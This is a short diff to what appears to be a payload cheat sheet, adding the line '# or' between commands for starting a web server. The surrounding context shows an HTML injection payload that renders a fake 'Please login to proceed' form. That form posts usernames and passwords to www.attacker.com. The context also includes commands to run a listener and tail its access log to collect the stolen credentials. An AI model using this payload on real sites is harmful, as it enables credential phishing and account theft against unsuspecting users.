@@ -42,6 +42,7 @@ Submits credentials to the www.attacker.com (Embeds Login Screen inside applicat
 -----------------------
 ```
 # php -S xxx.xxx.xxx.xxx:80
+# or
 # service apache2 start 
 # tail -f /var/log/access.log
 <h3>Please login to proceed</h3> <form action=http://www.attacker.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
